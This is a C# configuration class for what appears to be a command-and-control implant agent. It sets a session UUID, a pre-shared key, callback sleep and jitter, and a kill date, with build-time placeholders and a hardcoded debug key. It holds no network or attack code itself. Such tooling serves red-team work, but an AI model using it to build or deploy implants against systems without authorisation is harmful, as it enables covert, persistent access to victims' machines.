using Agent.Interfaces;

namespace Agent.Config
{
    //Todo make this loadable via embedded resource json
    public class AgentConfig : IAgentConfig
    {
        public string? uuid
        {
            get
            {
                return _uuid;
            }
            set
            {
                _uuid = value;
                if (SetAgentConfigUpdated is not null)
                {
                    SetAgentConfigUpdated(this, new EventArgs());
                }
            }
        }
        private string? _uuid;
        public int sleep { get; set; } = 60;
        public int jitter { get; set; } = 10;
        private string? _psk;
        public string? psk
        {
            get
            {
                return _psk;
            }
            set
            {
                _psk = value;
                if(SetAgentConfigUpdated is not null)
                {
                    SetAgentConfigUpdated(this, new EventArgs());
                }
            }
        }
        public DateTime killDate { get; set; }

        public AgentConfig()
        {
            uuid = "%UUID%";

            psk = "%PSK%";
#if DEBUG
            sleep = 1;
            jitter = 1;
            uuid = "fb3f4265-e6bc-43db-9d03-743f7b875e30";
            psk = "TInS7W+1JWtteXPU+p3PfuyL/ott19n2pYtrjqsDoMs=";
            killDate = DateTime.Now.AddYears(1);
#endif
            int _tempInt = 0;
            if(int.TryParse("callback_interval", out _tempInt)){
                sleep = _tempInt;
            }

            if(int.TryParse("callback_jitter", out _tempInt))
            {
                jitter = _tempInt;
            }

            DateTime _killDate = DateTime.Now.AddYears(1);
            if(DateTime.TryParse("killdate", out _killDate))
            {
                killDate = _killDate;
            }

        }

        public event EventHandler? SetAgentConfigUpdated;
    }
}
